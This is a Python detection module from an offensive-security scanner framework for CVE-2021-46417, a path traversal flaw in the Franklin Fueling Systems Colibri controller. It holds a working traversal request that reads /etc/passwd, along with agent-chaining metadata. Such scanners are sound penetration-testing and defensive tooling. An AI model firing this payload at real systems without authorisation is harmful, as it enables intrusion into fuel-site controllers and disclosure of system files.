#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Franklin Fueling Systems Colibri Controller Module 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Franklin Fueling Systems Colibri Controller Module 1.8.19.8580 - Local File Inclusion Detection',
        'description': 'Franklin Fueling Systems Colibri Controller Module 1.8.19.8580 is susceptible to local file inclusion because of insecure handling of a download function that leads to disclosure of internal files due to path traversal with root privileges.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'packetstorm', 'franklinfueling', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/166671/Franklin-Fueling-Systems-Colibri-Controller-Module-1.8.19.8580-Local-File-Inclusion.html',
            'https://drive.google.com/drive/folders/1Yu4aVDdrgvs-F9jP3R8Cw7qo_TC7VB-R',
            'http://packetstormsecurity.com/files/166610/FFS-Colibri-Controller-Module-1.8.19.8580-Directory-Traversal.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-46417',
            'https://github.com/KayCHENvip/vulnerability-poc',
        ],
        'cve': 'CVE-2021-46417',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/tsaupload.cgi?file_name=../../../../../..//etc/passwd&password=', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Franklin Fueling Systems Colibri Controller Module 1.8.19.8580 - Local File Inclusion detected",
                path='/cgi-bin/tsaupload.cgi?file_name=../../../../../..//etc/passwd&password=',
            )
            return True
        return False

